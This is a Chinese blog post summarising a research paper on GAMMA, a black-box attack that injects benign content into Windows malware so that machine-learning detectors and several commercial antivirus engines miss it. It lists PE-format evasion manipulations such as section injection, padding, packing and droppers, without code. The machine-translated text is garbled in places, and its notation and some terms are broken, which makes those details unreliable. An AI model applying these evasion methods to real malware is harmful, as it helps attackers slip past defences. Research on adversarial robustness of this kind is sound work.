      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/3SMQYQP/" class="post-title-link" itemprop="url">AI安全（5）Functionality-Preserving Black-Box Optimization of Adversarial Windows Malware 2021 TIFS</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-25 19:54:55" itemprop="dateCreated datePublished" datetime="2021-07-25T19:54:55+08:00">2021-07-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-21 13:43:54" itemprop="dateModified" datetime="2023-04-21T13:43:54+08:00">2023-04-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/" itemprop="url" rel="index"><span itemprop="name">学术前沿</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>12k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>22 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2><span id="functionality-preservingblack-box-optimization-of-adversarial-windows-malware-2021-tifs"><strong>Functionality-Preserving
Black-Box Optimization of Adversarial Windows Malware 2021 TIFS
</strong></span></h2>
<p><strong>keyword:</strong> 对抗样本；黑盒优化；</p>
<h3><span id="abstract">Abstract：</span></h3>
<p>基于机器学习的Windows恶意软件检测器很容易受到攻击性示例的攻击，即使攻击者只获得对模型的黑盒查询访问权限。这些攻击的<strong>主要缺点</strong>是：<strong>查询效率低</strong>下，因为它们依赖于对输入恶意软件反复应用随机转换；它们可能还需要在优化过程的<strong>每次迭代中在沙盒中执行恶意软件</strong>，以确保其入侵功能得到保留。依赖于在恶意文件的<strong>末尾或在一些新创建的部分中注入良性内容</strong>（这些内容永远不会被执行）。<strong>我们的攻击被形式化为一个有约束的最小化问题，这也使得规避检测的概率和注入的有效负载的大小之间的权衡得到优化</strong>。对两种流行的静态Windows恶意软件检测器进行了实证研究，结果表明，即使只返回预测的标签，我们的黑盒攻击也可以通过很少的查询和较小的有效负载绕过它们。还评估了我们的攻击是否会转移到其他商业防病毒解决方案中，并意外地发现它们平均<strong>可以避开12个以上的商业防病毒引擎</strong>。讨论了我们的方法的<strong>局限性</strong>，以及它将来可能扩展到基于动态分析的目标恶意软件分类器。</p>
<h3><span id="一-introduction">一、Introduction</span></h3>
<p>机器学习在计算机安全领域正变得越来越普遍。学术界和工业界都在投入时间、金钱和人力资源来应用这些统计技术来解决恶意软件检测的艰巨任务。特别是，Windows恶意软件仍然是一种威胁，因为每天都有成千上万的恶意程序被上传到<strong>VirusTotal</strong><sup>[1]</sup>。现代方法使用机器学习来大规模检测此类威胁，利用许多不同的学习算法和特征集<sup>[1]–[7]</sup>。虽然这些技术已显示出很有前途的恶意软件检测能力，但它们最初的设计目的并不是为了处理攻击者可以操纵输入数据以逃避检测的非平稳、对抗性问题。</p>
<p>在过去的十年中，这一点在对抗式机器学习领域得到了广泛的证明<sup>[8]，[9]</sup>。该研究领域研究了机器学习算法在训练或测试阶段受到攻击时的安全性问题。特别是，在基于学习的Windows恶意软件检测器的背景下，已经证明可以针对目标系统仔细优化对抗性恶意软件样本以绕过它<sup>[10]–[17]</sup>。其中许多攻击都在黑盒设置中进行了演示，在黑盒设置中，攻击者只能对目标模型进行查询访问<sup>[14]–[17]</sup>。这确实对作为云服务部署的此类系统的安全性提出了质疑，因为外部攻击者可以查询这些系统，然后根据目标系统提供的反馈优化其操作，直到实现规避。</p>
<p>然而，这些黑盒攻击在以下方面仍然不是非常有效：（i）所需查询的数量<strong>(reguired
queries)</strong>，（i）其优化过程的复杂性<strong>(complexity)</strong>，以及（i）<strong>对输入样本执行的操作量(amount
of manipulations)</strong>，如下所述: 1. 首先查询效率 is hindered by the
fact that
攻击通过反复迭代并非专门针对逃避检测的转换（如在文件结尾后注入随机字节）来优化恶意软件。优化过程在计算上可能要求很高，因为有些攻击需要在每次迭代时在沙盒中执行敌对恶意软件样本，以确保其入侵功能得到保留。这种验证步骤是由在特征空间中操纵数据（而不是考虑可实现的输入修改<sup>[18]</sup>的攻击所要求的或者考虑可能破坏恶意软件样本<sup>[14]</sup>的功能的输入变换<sup>[19]</sup>。
2.
虽然在沙盒中执行一次恶意软件样本可能不会显著减慢整个过程，但因为它需要在感染前的阶段恢复虚拟环境的状态。当优化过程的每次迭代后都必须重复此步骤时，问题就变得相关了。此外，许多恶意软件样本可以检测它们是否在虚拟环境中运行，并延迟执行以保持未被检测到：Malware
dynamic analysis evasion techniques：A survey； 3.
所有这些攻击都通过显著操纵输入恶意软件的内容来实现规避，而<strong>不考虑额外的限制</strong>，例如，对生成的文件大小或注入的节数的限制。这可能导致攻击样本很容易被检测为异常，只需查看一些无关紧要的特征（<strong>trivial
characteristics</strong>），如文件大小或节数。</p>
<p>在本文中，我们提出了一个新的黑盒攻击家族（Section 3）
可以有效地优化恶意软件样本。首先，我们的攻击是高效查询的，因为它们依赖于注入特定目标的内容以便于规避，即从良性样本中提取（而不是随机生成）。第二，它们在设计上保留了功能，因为它们利用了一组操作，这些操作仅通过利用用于在磁盘上存储程序的文件格式的模糊性将内容注入恶意程序，而不改变其执行跟踪。虽然在这项工作中，我们只关注在文件末尾（填充）或在一些新创建的节（节注入）中注入内容，但我们的方法足够通用，可以包含更广泛的功能保留操作。最后，我们的攻击更加隐蔽。特别地，它们被形式化为<strong>一个约束最小化问题，该问题不仅优化了规避检测的概率</strong>，而且通过一个特定的正则化项<strong>（via
a specific regularization
term.）</strong>来惩罚注入的敌方有效载荷的大小。</p>
<h3><span id="二-programs-and-malwaredetection">二、PROGRAMS AND MALWARE
DETECTION</span></h3>
<p>在本节中，我们首先讨论Windows可移植可执行文件（PE）格式，2它描述了程序如何存储在磁盘上，并向操作系统（OS）解释了如何在执行之前将其加载到内存中。然后，我们将介绍这项工作剩余部分中使用的两种流行的基于学习的Windows恶意软件检测器。</p>
<h4><span id="21-the-windowsportable-executable-pe-file-format">2.1 The Windows
Portable Executable (PE) File Format</span></h4>
<p>Windows
PE格式由几个组件组成，如图1所示，如下所述。DOS标题（A）。它包含用于在DOS环境中加载可执行文件的元数据，以及DOS存根，如果在DOS环境中执行，则会打印“此程序无法在DOS模式下运行”。保留这两个组件是为了保持与旧版Microsoft操作系统的兼容性。从现代应用程序的角度来看，DOS头中唯一相关的部分是：（i）幻数MZ，文件的两字节长签名，以及（ii）偏移量0x3c处的四字节长整数，用作指向实际头的指针。如果这两个值中的一个由于某种原因被置乱，则认为程序已损坏，操作系统将不会执行该程序。</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211340691.png" alt="image-20210724201057346" style="zoom:50%;"></p>
<p>PE
header（B）。它包含幻数PE以及其他文件特征，如目标体系结构、头大小和文件属性。</p>
<p>Optional
Header（C）。它包含操作系统初始化加载程序所需的信息。它还包含指向有用结构的偏移量，如操作系统解析依赖关系所需的导入地址表（IAT）和导出表偏移量，后者指示在何处查找其他程序可以引用的函数。截</p>
<p>Section
Table（D）。它是一个条目列表，指示程序的每个核心组件的特征，以及OS加载程序应该在文件中找到它们的位置。</p>
<p>Sections（E）节。这些连续的字节块承载着可执行文件的真实内容。要列出一些：。文本包含代码。数据包含全局变量和。rdata包含只读常量和计数。</p>
<p>可执行程序的结构可用于静态推断有关其行为的信息。事实上，大多数防病毒供应商应用静态分析来检测野外威胁，而不在受控环境中执行可疑程序。这种方法节省了时间和资源，因为防病毒程序不会在主机操作系统内执行可疑软件。静态分析是第一道防线，其性能对于抵御野外无数威胁至关重要。</p>
<h4><span id="22-learning-basedwindows-malware-detection">2.2 Learning-Based
Windows Malware Detection</span></h4>
<ul>
<li>MalConv</li>
<li>EMBER</li>
</ul>
<h3><span id="三-black-boxoptimization-of-adversarial-windows-malware">三、BLACK-BOX
OPTIMIZATION OF ADVERSARIAL WINDOWS MALWARE</span></h3>
<p>在本节中，我们将介绍一种新的黑盒攻击框架，命名为GAMMA（Genetic
adricative Machine learning Malware
attack）。GAMMA可以有效地优化敌方恶意软件样本，同时只需要黑盒访问模型，即只查询目标模型并观察其输出，而不访问其内部结构和参数。我们的攻击依赖于一组保留功能的操作，这些操作利用用于在磁盘上存储程序的PE格式的模糊性将内容注入恶意程序，而不改变其执行跟踪。这使我们能够摆脱需要计算的验证步骤，以确保被操纵的恶意软件保留其预期功能。特别是，我们认为这里的内容操纵，特别是针对有利于逃避，即，<strong>从良性样本中提取，而不是随机产生。虽然这使得我们的攻击更加有效，但值得注意的是，我们的框架足够通用，可以包含许多其他不同的内容操作技术</strong>。最后，为了使我们的攻击更加隐蔽，我们将其形式化为一个约束优化问题，该问题不仅最小化了逃避检测的概率，而且通过一个特定的惩罚项最小化了注入内容的大小。</p>
<p><strong>符号定义</strong>，我们用x 2 x表示  f0；：：：；255g 
（恶意）输入程序，描述为任意长度的字节字符串。然后，我们定义了一组k个不同的保留功能的操作，这些操作可以作为向量s2
s应用于输入程序x  [0；1]k</p>
<ul>
<li>Notation: <span class="math inline">\(x\)</span> malicious；<span class="math inline">\(s\)</span> (k 种
vector);（良性初始注入+遗传算法）</li>
</ul>
<figure>
<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211340847.png" alt="image-20210725161919601">
<figcaption aria-hidden="true">image-20210725161919601</figcaption>
</figure>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211340732.png" alt="image-20210725161950958" style="zoom:50%;"></p>
<h4><span id="31functionality-preservingmanipulations保留功能的操作">3.1
<strong>Functionality-Preserving
Manipulations</strong>（保留功能的操作）</span></h4>
<p>我们在这里讨论一组可以在我们的攻击框架中使用的保留功能的操作。在windowspe文件格式的上下文中，只有一些转换可以在不影响输入程序执行的情况下应用。我们将其分为结构性和行为性两类，详情如下。</p>
<ul>
<li><strong>Structural结构化</strong>：这一系列操作只影响输入程序的结构，利用文件格式中的模糊性，而不改变其行为。
<ol type="1">
<li>Perturb Header
Fields：扰动标题字段[13]–[15]。此技术包括更改节名称、中断校验和以及更改调试信息。</li>
<li>Filling Slack
Space：填充松弛空间[12]–[15]，[23]。此技术操纵编译器插入的空闲空间，以保持文件内部的对齐。相应的空闲字节（图1中的E内）通常被设置为零，并且它们从不被可执行文件的代码引用。</li>
<li><strong>Padding</strong>：填充[11]、[12]、[23]。这种技术在文件末尾注入额外的字节（在图1中的E之后）。</li>
<li>Manipulating DOS Header and
Stub：操作DOS头和存根[10]，[22]。这项技术修改了DOS头中一些现代程序不使用的字节。</li>
<li>Extend the DOS Header:
扩展DOS标头[22]。这种技术通过在程序的实际头之前注入内容来扩展DOS头。</li>
<li><strong>Content
shifting</strong>：内容转移[22]。这种技术通过向前移动内容，在节的开始之前创建额外的空间，并在中间注入对抗性内容。</li>
<li>Import Function
Injection：导入函数注入[13]–[15]。该技术通过向导入地址表添加适当的条目来注入导入函数，指定在加载过程中必须包括哪个库中的哪个函数（这影响图1中的C和E）。</li>
<li>Section
Injection：第[13]-[15]节。这种技术通过在节表中创建一个额外的条目将新的节注入到输入文件中（从而影响图1中的D和E）。每个节条目的长度为40字节，因此所有内容都必须按该长度进行移位，而不会影响头指定的文件和节对齐方式。</li>
</ol></li>
<li><strong>Behavioral行为</strong>：这一系列的干扰可以改变程序的行为和执行痕迹，但仍然保留恶意软件程序的预期功能。例如，这些转换包含[24]中的二进制重写技术，如下所述。</li>
</ul>
<ol type="1">
<li>Packing：<strong>加壳</strong>[13]–[15]。软件加壳的原理是在原始程序外部添加一个保护层，以保护程序代码和数据不被恶意软件攻击者破解、篡改或复制。通过壳程序的加载和解码、原始程序的加密和解密、壳程序的动态反调试和反破解、以及代码混淆和虚拟机技术等手段，可以使程序更加安全和难以被攻击者破解。<strong>封隔器的作用是侵入性的，因为输入样本的整个结构都被修改了；</strong>
<ul>
<li>[13] R. L. Castro, C. Schmitt, and G. D. Rodosek, “ARMED: How
automaticmalware modifications can evade static detection?” in Proc. 5th
Int.Conf. Inf. Manage. (ICIM), Mar. 2019, pp. 20–27.</li>
<li>[14] R. L. Castro, C. Schmitt, and G. D. Rodosek, “Aimed: Evolving
malwarewith genetic programming to evade detection,” in Proc. 18th Int.
Conf.TrustCom, 2019, pp. 240–247.</li>
<li>[15] H. S. Anderson, A. Kharkar, B. Filar, and P. Roth, “Evading
machinelearning malware detection,” in Proc. BlackHat, 2017.</li>
</ul></li>
<li>Direct：直接[24]。这种方法重写代码的特定部分，比如用等价的指令替换汇编指令（例如，用相反的符号进行加法和减法）。
<ul>
<li>这种技术被称为“<strong>代码混淆</strong>”（code
obfuscation）。它是一种常见的恶意软件攻击技术，攻击者使用代码混淆技术来隐藏恶意代码的真实意图，使其更难以被检测和分析。</li>
<li>在这种技术中，攻击者会通过重写代码的特定部分来进行代码混淆。例如，攻击者可以用等价的指令替换汇编指令，或者用相反的符号进行加法和减法等操作。这样一来，原本的代码逻辑就被混淆了，使得恶意代码更难以被理解和分析。</li>
<li>代码混淆技术可以有效地防止恶意代码被检测和分析，因为它使得恶意代码的行为更难以被预测和理解。然而，代码混淆也会使得恶意代码更难以被清除和修复，因为恶意代码的行为可能会受到混淆代码的影响，从而导致误报和误判。</li>
<li>[24] M. Wenzl, G. Merzdovnik, J. Ullrich, and E. Weippl, “From
hackto elaborate technique—A survey on binary rewriting,” ACM
Comput.Surv., vol. 52, no. 3, pp. 1–37, Jul. 2019</li>
</ul></li>
<li>Minimal
Invasive[15]，[24]。此技术将入口点设置为新的可执行部分，该部分跳回原始代码。
<ul>
<li>这种技术被称为“<strong>代码注入</strong>”（code
injection）。它是一种恶意软件攻击技术，攻击者通过将恶意代码注入到受害者计算机中的合法进程中，来控制受害者计算机、窃取敏感信息或者执行其他恶意行为。</li>
<li>在这种技术中，攻击者会将恶意代码插入到被感染程序的可执行部分中，并将程序的入口点设置为恶意代码的起始位置，使程序在运行时首先执行恶意代码。然后，恶意代码会执行一些操作（如窃取信息、下载其他恶意代码等），最后将程序的控制权转回到原始代码中，以避免被检测到。</li>
<li>代码注入是一种常见的恶意软件攻击技术，攻击者可以使用多种方法来实现代码注入，如缓冲区溢出、API
Hooking、DLL注入等。为了防止代码注入攻击，建议用户保持软件的更新和使用安全软件进行防护。</li>
</ul></li>
<li>Full
Translation：完整翻译[24]。这种方法将所有代码提升到更高的表示形式，例如LLVM，4，因为它简化了扰动的应用，然后将代码翻译回汇编语言。
<ul>
<li>这种技术被称为“<strong>语义混淆</strong>”（semantic
obfuscation）。它是一种常见的恶意软件攻击技术，攻击者使用语义混淆技术来隐藏恶意代码的真实意图，使其更难以被检测和分析。</li>
<li>在这种技术中，攻击者会将所有代码提升到更高的表示形式，例如LLVM，因为这样可以简化扰动的应用。然后，攻击者会将代码翻译回汇编语言，但是这时的代码已经被语义混淆了，使得其更难以被理解和分析。</li>
<li>语义混淆技术可以有效地防止恶意代码被检测和分析，因为它使得恶意代码的行为更难以被预测和理解。然而，语义混淆也会使得恶意代码更难以被清除和修复，因为恶意代码的行为可能会受到混淆代码的影响，从而导致误报和误判。</li>
</ul></li>
<li>Dropper[30]。这种方法将代码存储为另一个二进制文件的资源，然后在运行时加载。
<ul>
<li>这种技术被称为“<strong>二进制文件注入</strong>”（binary file
injection）。它是一种恶意软件攻击技术，攻击者使用二进制文件注入技术来隐藏恶意代码，使其更难以被检测和分析。</li>
<li>在这种技术中，攻击者会将恶意代码存储为另一个二进制文件的资源，然后在运行时加载。这样一来，恶意代码就被隐藏在另一个二进制文件的资源中，使得它更难以被检测和分析。</li>
<li>二进制文件注入技术可以有效地防止恶意代码被检测和分析，因为它使得恶意代码更难以被发现。然而，二进制文件注入也会使得恶意代码更难以被清除和修复，因为恶意代码可能会被存储在多个文件中，从而需要进行全面的扫描和清除。</li>
<li>[30] F. Ceschin, M. Botacin, H. M. Gomes, L. Oliveira, and A.
Grégio,“Shallow security: On the creation of adversarial variants to
evademachine learning-based malware detectors,” in Proc. 3rd
ReversingOffensive-Oriented Trends Symp., 2019, pp. 1–9.</li>
</ul></li>
</ol>
<ul>
<li><strong>Padding and Section-Injection Attacks
填充和节注入攻击</strong></li>
</ul>
<p>虽然GAMMA可以通过在[33
]中的开源实现支持大多数上述操作，但是我们只考虑在这项工作中的<strong>填充</strong>和<strong>分段注入攻击</strong>，因为它们提供了两个<strong>有代表性的示例</strong>，即在不需要操纵额外的头组件的情况下，在样本内注入内容（例如，节区表）。特别是，<strong>Padding</strong>将内容注入到可执行文件的未使用空间中，而不改变任何其他头组件。相反，<strong>Section
infection</strong>不仅允许像其他技术一样注入自定义内容，而且还通过在节表中添加节条目来操纵可执行文件的结构。</p>
<h3><span id="四-实验">四、实验</span></h3>
<p>在本节中，我们根据经验评估了针对GBDT和MalConv恶意软件检测器的攻击的有效性。我们在一台装有Intel的工作站上进行了实验 
至强  CPU E5-2670，具有48个CPU和128 GB
RAM。MalConv的预训练版本呈现出略有不同的体系结构w.r.t。原始公式：1
MB的输入大小和256的填充值，以避免移动预处理部分。该网络使用PyTorch实现【25】。我们使用DEAP开发了GAMMA的遗传优化器【26】。我们使用10个元素的总体大小N测试了攻击，将查询预算T从10更改为510。如果优化器在一个局部最小值上停滞了5次以上的迭代，我们将停止该过程。我们使用正则化参数的值 
2层10  ig9i=3。由于攻击特征空间S在攻击者可能添加的节数上是参数化的，因此我们随机提取了75个。如第III-a节所述，我们的goodware数据集中的rdata部分将用于向输入恶意软件添加内容，最大容量为2.5
MB。我们愿意将此数字设置为高值，因为优化器将发现较小的有效负载，这要归功于行为为“1”标准的惩罚术语所施加的稀疏性。我们实现并公开了用于计算这些攻击的库，名为secml恶意软件。5.</p>
<h4><span id="41-无攻击时的性能">4.1 无攻击时的性能</span></h4>
<p>为了在没有攻击的情况下评估这两种分类器的性能，我们收集了一组分类器；15000良性和15；000个恶意软件样本。恶意软件样本是从VirusTotal收集的，而<strong>goodware样本是通过从GitHub下载可执行程序收集的</strong>。结果如图3所示。为GBDT选择的阈值为0.8336，对应于0.039的假阳性率（FPR）和0.95的真阳性率（TPR）。<strong>MalConv使用的阈值为0.5，这导致FPR为0.035，TPR为0.69</strong>。图中的红点直接在曲线上显示这些值。这些结果与GBDT【6】的作者给出的描述相当，因为两种检测器的w.r.t得分略低。这篇论文中报道了这一点。不过，它们都可以作为我们分析的基线。</p>
<h4><span id="42-攻击评估">4.2 攻击评估</span></h4>
<p>我们从收集的15K恶意软件中<strong>随机抽取500个用于对抗性攻击</strong>，其中包括5.3%的勒索软件、29%的下载软件、18%的病毒、7%的后门软件、29%的灰色软件、8%的蠕虫，以及其他百分比较低的家族。图4显示了检测率和对抗性有效载荷大小如何随查询数量和正则化参数的值而变化。曲线图中的每条曲线都是通过计算每个值的平均检测率和平均大小生成的 ,
针对发送的不同查询数重复此操作。作为的值 
由于在计算目标函数时，惩罚项可以忽略不计，因此该算法可以找到更多有效载荷较大的规避样本。另一方面，通过增加 
由此产生的攻击特征向量变得稀疏，生成更小但更可检测的对抗性示例。在这种情况下，惩罚项会吞噬分类器计算的分数，这在优化过程中变得无关紧要。另一个重要影响是遗传优化器使用的总查询数：发送的越多，敌对示例的检测率和大小越好。直观地说，通过发送更多的查询，GAMMA可以同时探索更多隐藏和回避的解决方案，但在优化过程的早期阶段无法找到此类解决方案。为了证明我们的方法的有效性，我们报告了应用递增长度随机字节序列的结果。这个实验强调了轻微的下降趋势，但使用良性内容注入的优化攻击比随机干扰更有效。分段注入攻击比填充攻击更能降低GBDT的检测率。由于第一种技术还在节表中引入了节条目，因此与填充攻击修改的特性相比，对抗性有效载荷干扰的特性更多。</p>
<figure>
<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211340248.png" alt="image-20220606205653971">
<figcaption aria-hidden="true">image-20220606205653971</figcaption>
</figure>
<h4><span id="43-硬标签攻击">4.3 硬标签攻击</span></h4>
<p>我们在表I中显示了聚合结果，重点比较了软标签和硬标签攻击的性能。每个条目表示每个检测器的平均检测率和平均对抗有效负载大小，给定一对用于计算指定攻击的查询/正则化参数。我们计算了4个不同的 
在集合f10中  （2i+1）g4i=1。结果表明，在没有置信度得分的情况下，一旦发现一个规避有效载荷，则无论正则化参数的值如何，其大小都会在遗传算法的一次又一次迭代中得到优化 .
这是由我们为实验设置的结果造成的：我们使用一个无限值来丢弃每个检测到的敌对示例，因此所有剩余的示例仅用于优化大小，作为优化的约束本身。我们的方法在这种环境中的有效性是由注入的内容的性质引起的，它模仿良性类，图4证实了这一点，其中注入随机字节序列对目标没有影响。相反，查询的数量本身起到了调节器的作用，因为太少的查询会导致更大的对抗性有效载荷，而置信度较低，而大量的查询会导致分数较高的小有效载荷。</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211341881.png" alt="image-20220606205832607" style="zoom:50%;"></p>
<h4><span id="44-时间分析">4.4 时间分析</span></h4>
<p>从时间的角度来看，GAMMA的复杂性主要取决于查询探测器所花费的时间。表II显示了计算每个攻击和目标的单个查询所需的平均运行时间。令人惊讶的是，特征提取阶段和GBDT预测所花费的时间之和小于神经网络处理所有字节所需的时间。</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211341457.png" alt="image-20220606210050720" style="zoom:50%;"></p>
<h4><span id="45-加壳影响">4.5 加壳影响</span></h4>
<p>由于这些分类器仅利用静态特征，因此我们有理由问自己，在不应用第三节中介绍的所有技术的情况下，加密程序内容是否足以逃避检测。<strong>打包是一种通过应用压缩、加密或编码算法来减少可执行文件大小的技术。由于打包器的作用完全改变了磁盘上的程序表示，恶意软件供应商广泛使用打包器向分析师隐藏其产品，增加了逆向工程分析的难度。</strong>在这种情况下，我们将一种著名的技术UPX7应用于1000个恶意软件和1000个goodware程序，并测试MalConv和GBDT的规避率。UPX封隔器的有效性如图5所示。这两个检测器在打包样本时都会给出恶意分数，通过查看打包好的goodware程序的方框图，这是很直观的。这两种检测器都增加了它们对恶意软件类别的得分，而打包恶意软件的均值和方差只有很小的变化。</p>
<p>从这些结果来看，我们认为，探测器将包装技术的应用视为一种恶意特征。这可能是由于训练集中有大量打包的恶意软件，而不是缺少打包的好软件。因此，基于此类数据训练的模型可能会有偏差，使他们错误地认为样本是恶意的，只是因为它是打包的。此外，如果使用一种技术打包足够的样本，学习算法应该能够捕获打包程序中打包程序本身留下的签名。例如，UPX打包器创建两个名为UPX0和UPX1的可执行部分，其中包含提取代码和原始压缩程序。<strong>我们认为，通过包装技术进行规避更可能由看不见的包装商实现，即恶意软件供应商自己开发的定制解决方案</strong>。</p>
<blockquote>
<p>We believe that evasion through packing techniques should more likely
to be achieved by unseen packers, <strong>i.e.</strong> custom solutions
developed by malware vendors themselves.</p>
</blockquote>
<h4><span id="46evaluation-on-antivirus-programs-virustotal">4.6
<strong>Evaluation on Antivirus Programs</strong> (VirusTotal)</span></h4>
<p>我们在此评估我们的攻击对商用探测器的影响。在这种情况下，我们无意逃避这些商业程序的检测，例如打包输入样本，而是评估这些方法是否可以检测到我们的攻击，因为我们的攻击只对输入恶意软件样本的内容进行了最小程度的修改。特别是，我们应用于恶意软件样本的操作仅涉及每个程序的语法结构，我们的目的是评估此类转换的应用是否会对其他防病毒程序构成威胁。我们预计，大多数商业解决方案不应受到此类攻击的影响。我们依赖VirusTotal检索到的响应，8这是许多威胁检测器的在线接口。该服务提供了一个API，可以通过从远程上传样本来查询系统。我们通过在向样本中注入对抗性负载之前和之后发送200个恶意软件样本来测试我们的攻击性能，该样本使用针对GBDT分类器的分段注入攻击进行了优化。我们还将我们的攻击与基线随机攻击进行比较，基线随机攻击只是向每个样本添加50
KB的随机负载。表三显示了VirusTotal上托管的防病毒程序平均有多少（总共70个）检测到提交的恶意软件样本。虽然随机攻击只会略微减少每个样本的检测数量，但分段注入攻击能够绕过平均每个样本12个以上的检测器。为了更好地评估我们的攻击对单个杀毒程序的影响，在表IV中，我们报告了2019年Gartner端点保护平台幻方图上出现的9种不同杀毒产品的检测率，9包括许多领先和有远见的产品，在执行随机和部分注入攻击之前和之后。在许多情况下，我们的节注入攻击能够大幅降低检测率（参见，例如，AV1、AV3、AV7和AV9），显著优于随机攻击（参见，例如，AV1和AV9）。原因可能是，其中一些防病毒程序已经使用基于静态机器学习的检测器，在保护终端客户端免受恶意软件攻击时实施了第一道防线，这也在他们的博客或网站上得到了证实，这使他们更容易受到我们的攻击。综上所述，我们的分析强调，这些商业产品可以通过转移攻击来规避，我们相信，通过对其进行优化攻击，它们的检测率可能会下降更多。</p>
<h3><span id="五-related-work">五、RELATED WORK</span></h3>
<h5><span id="强化学习15">强化学习[15]</span></h5>
<blockquote>
<p>Anderson等人[15]提出了一种强化学习方法，以确定导致逃避的最佳操作顺序。为了测试代理的有效性，他们还测试了随机选取的操作的应用。他们用作基线的模型是我们在这项工作中分析的GBDT分类器的原始版本，使用较少的样本进行训练。为了训练学习代理的策略，他们通过为可使用的查询数量确定预算，让模型探索对抗性示例的空间。用于培训这些策略的查询平均数量约为1600[15]。作者没有报告对抗性恶意软件产生的文件大小：强化学习方法包含放大磁盘上表示的操作，但不清楚如何和多少。不同的是，我们的方法不需要培训阶段，因为它可以针对远程探测器进行部署。我们使用的转换在设计上是功能不变的，它们的应用程序不会改变程序的执行流。最后，通过在优化过程中插入正则化器，我们考虑了有多少内容被添加到输入恶意软件中。通过这种方法，可以控制插入噪声的数量，并且该算法可以找到不仅避开目标分类器，而且在大小上受到限制的对抗性示例。</p>
</blockquote>
<h5><span id="随机算法和遗传算法1314">随机算法和遗传算法[13],[14]</span></h5>
<blockquote>
<p>Castro等人[13]，[14]应用随机算法和遗传算法来干扰输入恶意软件，并在沙箱中的优化过程的每次迭代中测试样本的功能。这些突变与Anderson等人提出的相同[15]。这些工作的作者表示，他们需要大约4分钟来创建敌对恶意软件，使用100个查询。尚未公布任何架构细节。我们不需要在沙箱中验证恶意软件，因为我们在变异过程中包含了领域知识。因此，我们的方法在同一时间跨度内执行1400个查询。他们也没有报告哪些是导致规避的最具影响力的突变：后者至关重要，我们正在处理统计算法中的潜在漏洞，与其他安全漏洞相比，这些漏洞的存在并不明显。</p>
</blockquote>
<h5><span id="gan27">GAN[27]</span></h5>
<blockquote>
<p>Hu和Tan[17]开发了一个生成性对抗网络（GAN）[27]，其目的是绕过目标分类器，打造对抗性恶意软件。网络会了解哪些API导入应该添加到原始样本中，但不会生成真正的恶意软件，因为这种攻击只在功能空间内运行。相反，由于每次都会生成真实的样本，因此我们创建了功能正常的恶意软件。针对Windows恶意软件检测器的黑匣子攻击的概述见表V，其中我们将上述技术与我们的方法进行了比较。</p>
</blockquote>
<h3><span id="六-conclusion-and-futurework">六、<strong>CONCLUSION AND FUTURE
WORK</strong></span></h3>
<p>在本文中，我们<strong>提出了一个基于学习的Windows恶意软件检测器的新的黑盒攻击家族，它既能有效地进行查询，又能保持功能</strong>，克服了以往工作的局限性。我们的攻击依赖于在恶意文件末尾或在新创建的部分中注入良性内容（这些内容永远不会被执行），利用用于在磁盘上存储程序的文件格式的模糊性，而不改变其执行痕迹。所提出的攻击被形式化为一个有约束的最小化问题，该问题能够在规避检测的概率和注入的有效负载大小之间进行优化。我们对两个流行的基于学习的Windows恶意软件检测器进行了广泛的实证评估，结果表明，即使目标模型只输出预测的标签，我们的黑盒攻击也可以通过很少的查询和非常小的有效负载绕过它们。我们还表明，我们的攻击可以成功地转移到其他商业防病毒解决方案，发现他们可以逃避，平均而言，多达12个商业防病毒引擎提供的VirusTotal。尽管如此，我们相信直接针对这些探测器的优化攻击可能会更加有效。未来工作：未来工作的一个有趣途径是调查针对我们的攻击的适当对策的适用性，如第节所讨论的。六、
包括使用更健壮的特征表示（对基于字节或基于节的操作不敏感）和学习范式（通过对抗性再训练、特定攻击检测机制或使用领域知识约束）。另一个有希望的研究方向是将我们的攻击扩展到只在文件末尾或新创建的部分中注入内容的操作之外。我们坚信这是可以很容易实现的，因为我们的方法已经足够普遍，可以包含更广泛的功能保留操作，包括第节中讨论的操作。III-A级。将我们的工作扩展到处理也可以修改恶意软件程序动态执行的操作，例如在保留恶意意图的同时改变其控制流，无疑是一个挑战。然而，这无疑将为改进基于动态程序分析提取的特征的恶意软件检测器的评估和对抗性健壮性提供重要的一步。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
